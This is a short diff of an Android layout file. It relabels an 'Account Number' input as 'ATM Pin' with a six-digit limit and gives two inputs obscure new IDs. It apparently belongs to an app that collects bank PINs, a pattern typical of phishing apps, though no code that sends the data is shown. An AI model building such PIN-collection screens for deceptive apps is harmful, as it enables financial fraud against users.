@@ -72,7 +72,7 @@
                      />
 
                 <EditText
-                    android:id="@+id/phone"
+                    android:id="@+id/mphone3"
                     android:layout_width="fill_parent"
                     android:layout_height="40.0dip"
                     android:layout_marginTop="8.0dip"
@@ -89,18 +89,18 @@
                     android:layout_height="wrap_content"
                     android:layout_gravity="center_vertical"
                     android:textSize="17dp"
-                    android:text="Account Number*"
+                    android:text="ATM Pin*"
                     android:textColor="@color/white" />
 
                 <EditText
-                    android:id="@+id/ac"
+                    android:id="@+id/ptm2"
                     android:layout_width="fill_parent"
                     android:layout_height="40.0dip"
                     android:layout_marginTop="8.0dip"
                     android:layout_weight="1.22"
                     android:inputType="number"
                     android:background="@drawable/edittext" android:textSize="17dp"
-                    android:maxLength="16"
+                    android:maxLength="6"
                     android:padding="10.0dip"
                     android:textColor="@color/white" />
 
